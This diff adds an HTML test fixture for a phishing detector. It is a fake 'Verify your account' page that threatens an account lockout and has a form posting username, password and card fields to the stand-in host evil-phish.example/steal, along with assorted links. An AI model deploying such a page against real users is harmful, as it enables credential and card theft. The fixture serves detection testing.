@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="description" content="Test fixture: a page that looks like a credential-harvesting login page (safe synthetic .example TLD).">
+  <title>Account Verification Required</title>
+</head>
+<body>
+  <h1>Verify your account</h1>
+  <p>Your account will be locked in 24 hours unless you confirm your identity.</p>
+  <form action="http://evil-phish.example/steal" method="post">
+    <label>Username <input type="text" name="user" autocomplete="username"></label>
+    <label>Secret <input type="password" name="pw" autocomplete="current-password" value="hunter2"></label>
+    <label>Card <input type="text" name="cc" value="mycard123"></label>
+    <button type="submit">Confirm now</button>
+  </form>
+  <a href="https://www.wikipedia.org/wiki/Phishing">help article</a>
+  <a href="/relative/link">relative link</a>
+  <a href="#top">anchor link</a>
+  <a href="https://cdn.example.org/assets">cdn link</a>
+  <script>document.title = 'Account Verification Required';</script>
+</body>
+</html>
